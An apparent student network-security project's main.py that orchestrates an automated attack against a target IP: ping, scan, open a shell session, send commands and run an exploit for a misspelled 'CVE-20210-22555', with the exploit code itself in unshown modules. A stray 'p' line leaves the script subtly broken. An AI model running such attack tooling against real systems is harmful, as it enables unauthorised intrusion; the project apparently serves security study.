#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
main.py

Source code : https://github.com/masjohncook/netsec-project

Author :

* masjohncook


Licence: None


**************
IMPORTANT NOTE
**************

This main.py will perform automatic attack on the CVE-20210-22555. It will perform ping, scanning, 
and exploiting the target

"""

import sys
from modules.scanning import Scanner
from modules.gain_access import GainingAccess

__author__ = 'masjohncook(mas.john.cook@gmail.com)'
__version__ = '0.0.1'
__last_modification__ = '2023/05/10'


############################################################################



def main(argv):
    if len(argv) < 2:
        print("Please specify the ip address")
        sys.exit(1)
    
    ip = argv[1]
    if len(argv) == 2:
        port = None
    else:
        port = argv[2]
    
    
    try:
        scan = Scanner(ip, port)
        gain = GainingAccess(ip, port)
        scan.ping_target()
        scan.check_status()
        scan.scanning_target()
        gain.openShellSession()
        gain.sendCommand()
        gain.exploitTarget()
        p
    except Exception as e:
        print(e)
        pass

main(sys.argv)